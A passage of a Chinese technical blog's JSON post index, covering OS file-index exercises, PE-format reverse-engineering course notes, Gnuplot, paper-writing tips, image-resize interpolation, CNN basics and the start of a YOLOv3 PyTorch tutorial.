地址各一个。试转换下列文件的字节偏移量为物理地址 (计算它们对应于索引节点的第几号地址项, 块内偏移量是多少?) (1) 12345位于Addr[填空1]中, 偏移量为[填空2] (2) 450000位于Addr[填空3]中, 偏移量为[填空4] 答案：6; 57; 10; 1488 解析：10个直接地址可以存储10*2KB = 20KB = 20480B 故12345在直接地址的储存范围内： 12345 // 2048 = 6 12345 % 2048 = 57 一块可以存储2KB/4B = 512个指针, 一级地址一共可以存储512*2KB = 1MB &gt; 450000B, 存储在Addr[10]中 450000 % 2048 = 1488 . 例题：某文件系统中, 每块大小为2KB, 每块地址用4B表示,地址结构采用下述方案10个直接地址, 两个一级索引地址和一个二级索引地址试求 (1) 该系统能管理的最大文件是多少[填空1]KB? (2) 若有一个逻辑大小为256MB的文件,采用上述方式存储在外存,请问该文件占用多少个盘块[填空2]? 答案：526356; 131329; 解析：（1）一块中一共可以存储2KB/4B = 512个地址； 直接地址可以存储10 * 2KB = 20KB 两个一级地址可以存储2 * 512 * 2KB = 2048KB 一个二级地址可以存储512 * 1024KB = 524288KB 最大文件大小为：20 + 2048 + 524288 = 526356 KB （2）计算这种题目的思路是：文件占用的盘块数 = 储存占用的盘块 + 索引盘块 256MB的文件需要占用256MB / 2KB = 128K个盘块（储存盘块） 一个一级地址可以索引512个盘块，两个一级地址可以索引1024个盘块 二级地址也就需要所以索引128K - 10 - 2*512 个盘块 （128K -10 - 2*512）/ 512 = 254（向上取整） 那么一共就需要2（两个一级地址索引盘块）+1（二级索引地址盘块）+254（二级地址中的一级索引盘块） = 257 一共需要：128K + 257 = 131329个盘块 需要注意的是：有的同学（比如我）可能会把最后的结果加上一个10，这是由于没有理解地址和储存之间的关系导致的。直接地址就是存储在地址当中的，不需要额外的去找盘块给它存储。所以计算索引盘块的时候不需要加上它； 例题：一个大小为64MB+40KB的 文件,按照UNIX多级索引存储,盘块大小为4KB,采用4字节编址,地扯结构中共有 10个直接地址,一次间接地址、二次间接地址和三次间接地址各一个, 请问该文件 共需占用多少个索引盘块[填空1]?如果是61MB的文件呢[填空2 ] ? 答案：17；17 解析：一个盘块可以存储4KB/4B = 1024个地址； 10个直接地址可以存储：10 * 4KB = 40KB 一次间接地址可以存储： 1024 * 4KB = 4MB 二次间接地址可以存储： 1024 * 4MB = 4GB 该文件存储一共需要（64MB + 40KB）/ 4KB = 16K + 10个盘块 一次间接地址可以索引1K个地址 二次间接地址需要(16K + 10 -1K - 10) / 1024 = 15个索引盘块 一共需要15+1+1 = 17个索引盘块 61MB也同理进行计算可以得到需要17个索引盘块 ¶第六章 并发程序设计 ​","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"操作系统","slug":"课程学习/操作系统","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"操作系统","slug":"操作系统","permalink":"http://blog.keter.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"「逆向工程」课程笔记","slug":"「逆向工程」课程笔记","date":"2021-11-25T02:28:47.000Z","updated":"2021-11-29T01:55:03.776Z","comments":true,"path":"2021/11/25/「逆向工程」课程笔记/","link":"","permalink":"http://blog.keter.top/2021/11/25/%E3%80%8C%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E3%80%8D%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/","excerpt":"","text":"RVA 如何转换到FOA ？（10分） RVA为00002010则FOA是多少？ 虚拟偏移是1000 2010//1000 = 2 =&gt; 第二个节 2010%1000 = 10 =&gt; 偏移是10 则FOA是600+10 = 610 一个动态链接库的大小是20 PE文件在加载的过程中内存的变化过程 从PE头偏移80H，得到RVA PE文件的开头（10分） PE文件的开头都是MZ，DLL也是一种PE文件。DLL文件的开头地址一定是对齐粒度的整数倍 导出表结构题的结构 导出表结构体结构如下： 有三项需要仔细掌握： NumberOfFunctions: 函数的数量，在导出表里不是以0作为结尾的，而是到足够数量后结束； AddressOfFunction: 函数入口的地址 AddressOfNames：函数名字的地址","categories":[],"tags":[]},{"title":"「Gnuplot」Gnuplot绘图指北","slug":"「Matlab」Matlab图像处理基本操作","date":"2021-10-09T04:22:12.000Z","updated":"2021-10-11T10:06:13.996Z","comments":true,"path":"2021/10/09/「Matlab」Matlab图像处理基本操作/","link":"","permalink":"http://blog.keter.top/2021/10/09/%E3%80%8CMatlab%E3%80%8DMatlab%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/","excerpt":"","text":"¶简介 Gnuplot 是一款适用于 Linux，OS/2，MS Windows，OSX，VMS 和许多其他平台的便携式命令行驱动图形工具。源代码受版权保护，但免费分发（即，您不必为此付费）。它最初创建的目的是让科学家和学生能够交互式地将数学函数和数据可视化，但已经发展到支持许多非交互式用途，例如Web脚本。它也被Octave等第三方应用程序用作绘图引擎。自1986年以来，Gnuplot一直得到支持和积极发展。 支持许多不同类型的 2D、3D 图 支持许多不同类型的格式输出 交互式屏幕显示：跨平台（Qt、wxWidgets、X11）、特定平台（Windows、OS/2） 丰富的输出格式：postscript（含 eps）、PDF、PNG、LaTex …… 可鼠标操作的 web 显示格式：HTML5、SVG ¶安装 如果你是Mac用户你可以非常简单的使用以下命令进行安装 brew install gnuplot Linux和Windows也可以非常简单的安装gnuplot，我这里就不写啦（偷懒）","categories":[],"tags":[{"name":"Gnuplot","slug":"Gnuplot","permalink":"http://blog.keter.top/tags/Gnuplot/"}]},{"title":"「阅读」《科技论文写作与发表教程》阅读笔记","slug":"「阅读」《科技论文写作与发表教程》阅读笔记","date":"2021-09-26T07:58:38.000Z","updated":"2021-09-26T14:19:20.543Z","comments":true,"path":"2021/09/26/「阅读」《科技论文写作与发表教程》阅读笔记/","link":"","permalink":"http://blog.keter.top/2021/09/26/%E3%80%8C%E9%98%85%E8%AF%BB%E3%80%8D%E3%80%8A%E7%A7%91%E6%8A%80%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E4%B8%8E%E5%8F%91%E8%A1%A8%E6%95%99%E7%A8%8B%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/","excerpt":"","text":"¶科技写作的流程 写作流程可以简单的分为一下几步： 调整心态 认真准备 抓紧去写 修改完善 ¶认真准备 在很大程度上写作就是模仿，找几篇在你所属研究领域获得高度评价的论文 看看这些论文的： 包含那几个部分 依照什么顺序 各部分占用多大的篇幅 如果有小标题，小标题用的是什么类型？一般使用多少图表？图表一般是什么类型？ 写作时遵守期刊对稿件的要求，认真阅读《投稿须知》 如果你还没有文献管理工具，是时候一个了 比如，EndNote,Referebce,Manager,Zotero等； 把设计论文的想法随时随地的记录下来 在在收集科研数据的时候，脑海中可能会出现一些撰写论文的想法，把这些想法记录下来 可以为各部分单独创建一个专用文件。记录这些想法有助于避免遗忘 当中演讲有助于论文写作 在研讨会（seminar）或者研究日上当众介绍自己的研究成果，还可以在学术会议上进行口头报告或者海报展示。当众演讲有助于形成论文的结构，听众提问有助于规划论文的内容 多做些准备工作，比如编制论文提纲 (outline) 提纲中可以列出某部分的要点，并对其进行反复分类、排序直到自己满意。可以编制一份正式的提纲。 在准备的过程中要注意，好办法的出现是需要一定时间的。如果想不出来好办法去撰写论文的开头或者规划某部分的结构，那就休息一会吧！锻炼一会、休息一会都可以，去转化一个思路。 ¶抓紧去写 抓**紧去写就是抽出时间来写论文。大多数的科研人员都很忙。**如果非要等到闲暇的时间才去写论文，那么这篇论文永远都出不来。因此一定要安排写作时间。在日历上或每日计划上规划好写作时间。除非有急事否则别让别的事情占用你的写作时间，可以要求自己在某一天前完成论文中的某一个部分。 在写作的时候觉得那部分容易写就先从哪个地方开始写。 一旦写起来就不要被小事情分散精力，遇到需要查询的信息先做一个标记。为了让这些更加容易被识别出来可以在软件中使用标注功能进行标注。 ¶修改完善 很大的程度上，写作就是修改。没有人会见到你的初稿，也没有人会见到你那么糟糕的初稿。对于有写作障碍的作者，这样想具有放松作用。关键是反复修改论文直到完善。 修改论文的时候可以思考如下的问题： 论文中是否包含全部必要的信息 论文中是否有应该删除的信息 论文中的信息是否准确 论文中的所有推理是否正确 论文的结构是否合理 论文的措辞时候清晰 论文的要点是否表示直接、简洁、扼要 论文的语法、拼接和单词用法是否都正确 论文中的全部图表时候设计得体 论文时候符合《投稿须知》 ¶规划文字 ¶斟酌标题 ¶论文标题很很重要 什么是一个好的标题？ 以较少的词汇充分的描述了论文的内容； 切记： 索引和摘要极度的依赖标题的准确性，不适当的标题可能会导致你的文献不会被找到。 论文标题无需诙谐，且通常不该诙谐，但是论文标题一定要清晰才行。 ¶措辞要具体 标题不是越简短越好，你的用词应该能够具体的表述你的工作内容。 比如这个标题Action of Antibiotics on Bacteria就没有Action of Antibiotics on Mycobacterium tuberculosis来的好。 ¶撰写摘要（How to Prepare the Abstract） 摘要应该被看作论文的微型版。摘要应当提供论文几大部分（引言、材料与方法、结果、讨论）的概要信息。摘要可以定义为文档信息概要 写摘要应该要： 说明科研工作的目标和范围 描述科研工作使用的方法 总结科研工作获得的结果 给出科研工作的结论 结论w wang ¶撰写引言部分 (How to Write the Introduction) ¶撰写材料与方法（How to Write the Materrials and Methods Section） ¶撰写结果部分（How to Write the Results） ¶撰写讨论部分（How to Write the Dicussion） ¶引用参考文献 (How to Cite the References)","categories":[],"tags":[]},{"title":"「基础知识」图像缩放对于模型精度的影响","slug":"「基础知识」图像缩放对于模型精度的影响","date":"2021-08-29T07:23:07.000Z","updated":"2021-11-04T02:44:40.364Z","comments":true,"path":"2021/08/29/「基础知识」图像缩放对于模型精度的影响/","link":"","permalink":"http://blog.keter.top/2021/08/29/%E3%80%8C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E3%80%8D%E5%9B%BE%E5%83%8F%E7%BC%A9%E6%94%BE%E5%AF%B9%E4%BA%8E%E6%A8%A1%E5%9E%8B%E7%B2%BE%E5%BA%A6%E7%9A%84%E5%BD%B1%E5%93%8D/","excerpt":"","text":"在基于卷积神经网络的应用过程中，图像Resize是必不可少的一个步骤。通常原始图像尺寸比较大，比如常见监控摄像机出来的是1080P高清或者720P准高清画面，而网络模型输入一般没有这么大，像Yolo系列目标检测的网络模型输入大小一般为608x608/416x416 等等。那么如何将大尺寸图像输入到网络模型呢？很容易想到的一个方法就是对原始图像进行Resize，将1920x1080的原始图像Resize到网络模型输入尺寸，比如608x608。在压缩图像的过程中，如果像尽最大可能的保留图像的特征就需要考虑很多的因素。 ¶是否应该保证宽高的一致？ 其实两种方式均可，前提是要保证模型训练和模型推理时的操作方式一致。也就是说，如果在网络模型训练时，所有的训练素材都是直接拉伸到网路的输入尺寸（不保持宽高比例），那么模型推理时也应该如此，反之亦然。其中保持宽高比例的做法一般是用增加padding的方式，然后用固定颜色填充，保证图像画面中部的内容不变形。下图说明两种方式的差异： **其实对于网络模型来讲，图像是否变形其实不太重要。如果在训练的时候，模型认为一个变形的动物是猫，那么经过大量数据拟合后，在推理阶段，它同样会正确识别出变形的目标。**当然根据相关资料显示，通常一般推荐使用直接拉伸的方式去做图像Resize，原因是增加padding填充后会对网络带来一定噪音，影响模型准确性，具体影响有多大我目前没有具体数据证明。这里需要指出的是，一些算法应用框架对细节封装得太好，对原始图像进行Resize的过程被隐藏起来，具体Resize的方式也不得而知。如果你发现模型集成后的准确性下降严重，这时候就需要检查一下框架对图像Resize的方式跟我们模型训练时是否一致。 ¶选择什么样的插值方式？ 我们在对图像进行上下采样时（缩放），有时候要在原有像素基础上删除一些像素值（缩小），有时候要在原有像素基础上增加一些像素值（放大），增加/删除像素的方式叫图像插值算法。OpenCV中的Resize函数其实有一个“插值模式”的参数，这个参数有一个默认值：INTER_LINER线性插值。它是一种插值方式，如果你在调用Resize函数时没有修改该参数值，那么该函数就以“线性插值”的方式进行图像缩放。 下面对各种插值方式进行一下总结： ¶近邻插值算法 近邻插值算法将目标图像中的点，对应到原图像中后，找到最相邻的整数坐标点的像素值，作为该点的像素值输出。 如上图所示，目标图像中的某点投影到原图像中的位置为点P，与P距离最近的点为Q11，此时易知，f§=f(Q11)。 举个例子： 将一幅3x3图像放大到4x4，用f(x , y)表示原图像，h(x ,y)表示目标图像，我们有如下公式： 缺点： 由最邻近插值法，放大后的图像有很严重的马赛克，会出现明显的块状效应；缩小后的图像有很严重的失真。 这是一种最基本、最简单的图像缩放方式。变换后的每个像素点的像素值，只由原图像中的一个像素点确定。例如上面，点(0,0.75)的像素只由(0,1)确定，这样的效果显然不好。点(0,0.75)的像素不止和(0,1)有关，和(0,0)也有关，只是(0,1)的影响更大。**如果可以用附近的几个像素点按权重分配，共同确定目标图像某点的像素，效果会更好。**下面的双线性插值就解决了这个问题。 ¶双线性插值 ¶线性插值 在讲双线性插值之前先了解一下线性插值。线性插值：**使用连接两个已知量的直线来确定在这两个已知量之间的一个未知量的值。**线性插值形式： f(x)=a1x+a0f(x)=a_{1} x+a_{0} f(x)=a1​x+a0​ 如下图所示： 线性插值多项式： y=y0+(x−x0)y1−y0x1−x0=y0+(x−x0)y1−(x−x0)y0x1−x0y=y_{0}+\\left(x-x_{0}\\right) \\frac{y_{1}-y_{0}}{x_{1}-x_{0}}=y_{0}+\\frac{\\left(x-x_{0}\\right) y_{1}-\\left(x-x_{0}\\right) y_{0}}{x_{1}-x_{0}} y=y0​+(x−x0​)x1​−x0​y1​−y0​​=y0​+x1​−x0​(x−x0​)y1​−(x−x0​)y0​​ 其实，即使x不在x0到x1之间，这个公式也是成立的。在这种情况下，这种方法叫作线性外插。 线性插值的误差：线性插值其实就是拉格朗日插值有2个结点时的情况。插值余项为： Rn(x)=f′′(ξ)(x−x0)(x−x1)2!≤f′′(ξ)(x0−x1)28,ξ∈(x0,x1)R_{n}(x)=\\frac{f^{\\prime \\prime}(\\xi)\\left(x-x_{0}\\right)\\left(x-x_{1}\\right)}{2 !} \\leq \\frac{f^{\\prime \\prime}(\\xi)\\left(x_{0}-x_{1}\\right)^{2}}{8}, \\xi \\in\\left(x_{0}, x_{1}\\right) Rn​(x)=2!f′′(ξ)(x−x0​)(x−x1​)​≤8f′′(ξ)(x0​−x1​)2​,ξ∈(x0​,x1​) 从插值余项可以看出，随着二阶导数的增大，线性插值的误差增大。即函数的曲率越大，线性插值近似的误差也越大。 举个例子。下图中，左边为原图像，拉伸后，理想的输出图像的像素分布应该为绿色箭头指向的，但是按照线性插值，会得到红色箭头指向的结果。 ¶双线性插值 双线性插值形式： f(x,y)=ax+by+cxy+df(x, y)=a x+b y+c x y+d f(x,y)=ax+by+cxy+d 双线性插值是线性插值在二维时的推广,在两个方向上共做了三次线性插值。定义了一个双曲抛物面与四个已知点拟合。 具体操作为在X方向上进行两次线性插值计算，然后在Y方向上进行一次插值计算。如下图所示： 首先，f(x,y)为二元函数，假设我们知道f(x0,y0),f(x1,y1),f(x0,y1),f(x1,y0)四个点的值。这四个点确定一个矩形，我们希望通过插值得到矩形内任意点的函数值。 先在x方向上进行两次线性插值，得到： f(x,y0)=x1−xx1−x0f(x0,y0)+x−x0x1−x0f(x1,y0)f(x,y1)=x1−xx1−x0f(x0,y1)+x−x0x1−x0f(x1,y1)\\begin{aligned} &amp;f\\left(x, y_{0}\\right)=\\frac{x_{1}-x}{x_{1}-x_{0}} f\\left(x_{0}, y_{0}\\right)+\\frac{x-x_{0}}{x_{1}-x_{0}} f\\left(x_{1}, y_{0}\\right) \\\\ &amp;f\\left(x, y_{1}\\right)=\\frac{x_{1}-x}{x_{1}-x_{0}} f\\left(x_{0}, y_{1}\\right)+\\frac{x-x_{0}}{x_{1}-x_{0}} f\\left(x_{1}, y_{1}\\right) \\end{aligned} ​f(x,y0​)=x1​−x0​x1​−x​f(x0​,y0​)+x1​−x0​x−x0​​f(x1​,y0​)f(x,y1​)=x1​−x0​x1​−x​f(x0​,y1​)+x1​−x0​x−x0​​f(x1​,y1​)​ 再在y方向上进行一次线性插值，得到： f(x,y)=y1−yy1−y0f(x,y0)+y−y0y1−y0f(x,y1)f(x, y)=\\frac{y_{1}-y}{y_{1}-y_{0}} f\\left(x, y_{0}\\right)+\\frac{y-y_{0}}{y_{1}-y_{0}} f\\left(x, y_{1}\\right) f(x,y)=y1​−y0​y1​−y​f(x,y0​)+y1​−y0​y−y0​​f(x,y1​) 综合起来，就是双线性插值的结果： f(x,y)=(y1−y)(x1−x)(y1−y0)(x1−x0)f(x0,y0)+(y1−y)(x−x0)(y1−y0)(x1−x0)f(x1,y0)+(y−y0)(x1−x)(y1−y0)(x1−x0)f(x0,y1)+(y−y0)(x−x0)(y1−y0)(x1−x0)f(x, y)=\\frac{\\left(y_{1}-y\\right)\\left(x_{1}-x\\right)}{\\left(y_{1}-y_{0}\\right)\\left(x_{1}-x_{0}\\right)} f\\left(x_{0}, y_{0}\\right)+\\frac{\\left(y_{1}-y\\right)\\left(x-x_{0}\\right)}{\\left(y_{1}-y_{0}\\right)\\left(x_{1}-x_{0}\\right)} f\\left(x_{1}, y_{0}\\right)+\\frac{\\left(y-y_{0}\\right)\\left(x_{1}-x\\right)}{\\left(y_{1}-y_{0}\\right)\\left(x_{1}-x_{0}\\right)} f\\left(x_{0}, y_{1}\\right)+\\frac{\\left(y-y_{0}\\right)\\left(x-x_{0}\\right)}{\\left(y_{1}-y_{0}\\right)\\left(x_{1}-x_{0}\\right)} f(x,y)=(y1​−y0​)(x1​−x0​)(y1​−y)(x1​−x)​f(x0​,y0​)+(y1​−y0​)(x1​−x0​)(y1​−y)(x−x0​)​f(x1​,y0​)+(y1​−y0​)(x1​−x0​)(y−y0​)(x1​−x)​f(x0​,y1​)+(y1​−y0​)(x1​−x0​)(y−y0​)(x−x0​)​ 如果选择一个坐标系统，使f(x)已知的四个点的坐标分别为(0,0),(0,1),(1,0),(1,1)，那么确定一个单位正方形，四个点分别为正方形的四个顶点： 首先对上端的两个顶点进行线性插值得： f(x,0)=f(0,0)+x[f(1,0)−f(0,0)]f(x, 0)=f(0,0)+x[f(1,0)-f(0,0)] f(x,0)=f(0,0)+x[f(1,0)−f(0,0)] 再对底端的两个顶点进行线性插值得： f(x,1)=f(0,1)+x[f(1,1)−f(0,1)]f(x, 1)=f(0,1)+x[f(1,1)-f(0,1)] f(x,1)=f(0,1)+x[f(1,1)−f(0,1)] 最后，做垂直方向的线性插值，以确定： f(x,y)=f(x,0)+y[f(x,1)−f(x,0)]f(x, y)=f(x, 0)+y[f(x, 1)-f(x, 0)] f(x,y)=f(x,0)+y[f(x,1)−f(x,0)] 整理得插值公式的化简形式： ¶原图像和目标图像的几何中心对齐 在计算目标图像中，对应原图像的虚拟坐标点时，一般的变换是： srcX⁡=dst⁡X(src⁡width /dstwidth )srcY⁡= dst Y(srcheight/dstheight )\\begin{aligned} \\operatorname{srcX} &amp;=\\operatorname{dst} X\\left(\\operatorname{src}_{\\text {width }} / d s t_{\\text {width }}\\right) \\\\ \\operatorname{srcY} &amp;=\\text { dst } Y\\left(src_{height} / d s t_{\\text {height }}\\right) \\end{aligned} srcXsrcY​=dstX(srcwidth ​/dstwidth ​)= dst Y(srcheight​/dstheight ​)​ 这种变换下，原图像的**有些点没有参与计算。**举个例子，把9∗9的原图像缩小成3∗3，原图像的原点(0,0)和目标图像的原点(0,0)都为左上角，目标图像右上角的坐标为(0,2)，对应原图像的坐标为(0∗(9/3),2∗(9/3))=(0,6)。目标图像右边已经没有点了，(0,6)右边的像素点也就用不到了。 原图像和目标图像的像素之间的对应关系如下： 从图片可以看出，只有圈出来的红色部分参与运算了。目标图像的每个像素点的灰度值相对于原图像偏左上方，右下角的元素实际上没有参与运算。 为了让原图像和目标图像的中心对齐，我们规定另外一种变换方式： src⁡X= dst X( src width / dst width )+0.5(src⁡width /dstwidth −1)srcY⁡=dstY( src height / dst height )+0.5(srcheight/ dst height −1)\\begin{gathered} \\operatorname{src} X=\\text { dst } X\\left(\\text { src }_{\\text {width }} / \\text { dst }_{\\text {width }}\\right)+0.5\\left(\\operatorname{src}_{\\text {width }} / d s t_{\\text {width }}-1\\right) \\\\ \\operatorname{srcY}=d s t Y\\left(\\text { src }_{\\text {height }} / \\text { dst }_{\\text {height }}\\right)+0.5\\left(src_{height} / \\text { dst }_{\\text {height }}-1\\right) \\end{gathered} srcX= dst X( src width ​/ dst width ​)+0.5(srcwidth ​/dstwidth ​−1)srcY=dstY( src height ​/ dst height ​)+0.5(srcheight​/ dst height ​−1)​ 就是在原来的变换后面加了调节因子： 0.5(srcwidth/dstwidth−1)0.5(src_{width}/dst_{width}−1) 0.5(srcwidth​/dstwidth​−1) 这种变换下，目标图像的中心点(1,1)，对应了原图像的中心点(4,4)，两个图像的几何中心重合，能充分利用原图像的点，并且目标图像的每个像素点之间都是等间隔的，也都和两边有一定的边距。实际上，在openCv中也是这种变换方式。 ¶参考文献 [1] https://zhuanlan.zhihu.com/p/362701716 [2] https://mp.weixin.qq.com/s?__biz=MzIyNjM2MzQyNg==&amp;mid=2247490559&amp;idx=1&amp;sn=d846921bd407e1cf2d56b0a0dcf8f684&amp;scene=21#wechat_redirect","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"「C3121N」卷积神经网络","slug":"「C3121N」卷积神经网络","date":"2021-08-27T11:51:37.000Z","updated":"2021-09-03T12:17:50.000Z","comments":true,"path":"2021/08/27/「C3121N」卷积神经网络/","link":"","permalink":"http://blog.keter.top/2021/08/27/%E3%80%8CC3121N%E3%80%8D%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/","excerpt":"","text":"¶卷积神经网络 CS231N中还比较详细的说明了卷积神经网络的历史，有兴趣的可以去看一看，这里我就不记录卷积神经网络的历史了。 卷积神经网络可以应用在非常多的方面：分类、检索、目标检测、无人驾驶、人脸识别、视频处理、人体姿态估计、强化学习、医疗诊断、神经风格迁移等等都有卷积神经网络的影子。 ¶卷积神经网络的基本结构 卷积神经网络有三个基础的组成部分：卷积层、池化层和全连接层。卷积层可以理解为特征的提取，池化层可以理解为把图像变小了，池化操作也可以叫做降采样。全连接层也就是最后的输出层。 ¶什么是卷积 ¶卷积运算 卷积的操作我认为可以用以下的描述来进行概括： 首先我们需要一个卷积核，常见的卷积核大小就是3x3的卷积核。卷积核在图像上进行滑动，每次滑动就进行一次卷积运算。经过卷积运算后就得到一个特征图。 下面这个图可以更好的说明卷积的运算过程： 卷积的运算过程就是相应区域的数字相乘后相加 如果只是单单的进行卷积我们会发现，中间的数经过了多次的运算。但是周围的数运算的次数是比较少的。这样对于周围的像素的不公平的。所以我们就可以在周围填充一圈的0。填充0一个是可以让周围的元素参与比较多次的计算一个是可以控制卷积运算后特征图的大小。 有图像处理相关经验的同学应该知道，一个图像是有三个通道的。那么理论上卷积运算也应该是对三个通道都要进行卷积运算才行。所以我们就会有三个卷积核分别进行计算。 下面这个图也可以比较好的说明这个问题： 在同济子豪兄的CS231N的视频里面有很多便于理解的动图，大家都可以去看一看。 卷积是一个特征提取的过程，不同的卷积核可以提取图像中不同的特征。 上图中通过不同的卷积核就可以提取出不一样的特征。左右分别的卷积核更容易提取出竖像分布的特征，上下分布的卷积核更容提取出横向分布的特征。 ¶卷积层 在卷积神经网络当中卷积层是重要的组成部分。卷积层简单来说就是又多个卷积核组成的。卷积层的参数也就是这些卷积核的参数。每个卷积核都会产生一个特征图，特征图叠加起来后就是卷积层的输出了。 ¶池化 池化进行的是特征图缩小的一个操作。对于一个特征图，我们不选取全部的数据去进行计算了，而且选取一部分的数据去进行计算,就相当于从特征图里面选了一些代表去进行计算。 那么我们如何去选取这些“代表”呢？我们有很多种方法可以选取这些代表，比如上图，我们如果选取一个方框里面的最大值这种池化方法就叫做最大池化，如果我们选取的是平均值这种池化方法就叫做平均池化。 那么池化有什么样的作用呢？ 神经网络经过池化层后可以对图像的位置信息更加不敏感也就是所谓的平移不变性。比如下面这个图，假设我们现在使用和眼睛相似度比较高的卷积核去卷积。如果不经过池化操作， /*-卷积之后的输出结构还是会有比较大的差距的。如果先使用了池化的操作再去使用卷积，卷积之后的输出就是一样的。 池化的主要作用总结一下就是： 减小参数量 平移不变性 防止过拟合 ¶总结 卷积神经网络是把卷积层、池化层和全连接层组合的 目前是趋势是使用更小的卷积核和更深的网络 倾向于不适用全连接层和池化层，池化和全连接都会让图片丢失空间信息。全连接层还会让参数量变的非常大。我们更愿意只使用卷积层也就是全卷积网络FCN","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"CS231N","slug":"深度学习基础知识/CS231N","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/CS231N/"}],"tags":[{"name":"C3231N","slug":"C3231N","permalink":"http://blog.keter.top/tags/C3231N/"},{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"「YOLOv3」从头实现YOLOv3目标检测（五）构建输入与输出管道","slug":"「YOLOv3」从头实现YOLOv3目标检测（五）构建输入与输出管道","date":"2021-08-20T02:48:06.000Z","updated":"2021-08-20T08:36:23.000Z","comments":true,"path":"2021/08/20/「YOLOv3」从头实现YOLOv3目标检测（五）构建输入与输出管道/","link":"","permalink":"http://blog.keter.top/2021/08/20/%E3%80%8CYOLOv3%E3%80%8D%E4%BB%8E%E5%A4%B4%E5%AE%9E%E7%8E%B0YOLOv3%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%EF%BC%88%E4%BA%94%EF%BC%89%E6%9E%84%E5%BB%BA%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA%E7%AE%A1%E9%81%93/","excerpt":"","text":"本教程转载于：https://blog.paperspace.com/how-to-implement-a-yolo-object-detector-in-pytorch/, 在原教程上加入了自己的理解，我的理解将用 这样的格式写出. （ 原博客中有错误的地方在本文中也进行了修正 ） 这是从头开始实现 YOLO v3检测器的教程的第5部分。在上部分中，我们实现了一个将网络输出转换为检测预测的函数。有了一个可以工作的检测器，剩下的就是创建输入和输出管道了。 在这一部分中，我们将构建检测器的输入和输出管道。这包括从磁盘上读取图像，进行预测，使用预测结果在图像上绘制边框，然后将它们保存到下来。我们还将介绍如何让detector在视频流中实时工作。我们将介绍一些命令行标志，以允许对网络的各种超级参数进行一些调整实验。那么让我们开始吧。 创建一个文件叫做detector.py, 添加必要的导入在它的顶部。 123456789101112131415from __future__ import divisionimport timeimport torch import torch.nn as nnfrom torch.autograd import Variableimport numpy as npimport cv2 from util import *import argparseimport os import os.path as ospfrom darknet import Darknetimport pickle as pklimport pandas as pdimport random ¶创建命令行参数 由于 detector.py 是我们要执行来运行检测器的文件，所以我们可以将命令行参数传递给它。我们使用 python 的 ArgParse 模块来实现这一点。 1234567891011121314151617181920212223242526272829303132333435def arg_parse(): &quot;&quot;&quot; 解析arg参数 &quot;&quot;&quot; parser = argparse.ArgumentParser(description=&#x27;YOLO v3 Detection Module&#x27;) parser.add_argument(&quot;--images&quot;, dest=&#x27;images&#x27;, help= &quot;Image / Directory containing images to perform detection upon&quot;, default=&quot;imgs&quot;, type=str) parser.add_argument(&quot;--det&quot;, dest=&#x27;det&#x27;, help= &quot;Image / Directory to store detections to&quot;, default=&quot;det&quot;, type=str) parser.add_argument(&quot;--bs&quot;, dest=&quot;bs&quot;, help=&quot;Batch size&quot;, default=1) parser.add_argument(&quot;--confidence&quot;, dest=&quot;confidence&quot;, help=&quot;Object Confidence to filter predictions&quot;, default=0.5) parser.add_argument(&quot;--nms_thresh&quot;, dest=&quot;nms_thresh&quot;, help=&quot;NMS Threshhold&quot;, default=0.4) parser.add_argument(&quot;--cfg&quot;, dest=&#x27;cfgfile&#x27;, help=&quot;Config file&quot;, default=&quot;cfg/yolov3.cfg&quot;, type=str) parser.add_argument(&quot;--weights&quot;, dest=&#x27;weightsfile&#x27;, help= &quot;weightsfile&quot;, default=&quot;yolov3.weights&quot;, type=str) parser.add_argument(&quot;--reso&quot;, dest=&#x27;reso&#x27;, help= &quot;Input resolution of the network. Increase to increase accuracy. Decrease to increase speed&quot;, default=&quot;416&quot;, type=str) return parser.parse_args() args = arg_parse()images = args.imagesbatch_size = int(args.bs)confidence = float(args.confidence)nms_thesh = float(args.nms_thresh)start = 0CUDA = torch.cuda.is_available() 其中，重要的标志包括images(用于指定输入图像或图像目录)、 det (用于保存检测的目录)、 reso (输入图像的分辨率，可用于速度精度折衷)、 cfg (可选配置文件)和权重文件。 ¶加载网络 从这里下载 coco.names 文件，该文件包含 COCO 数据集中对象的名称。在检测器目录中创建一个文件夹数据。同样地，如果你在 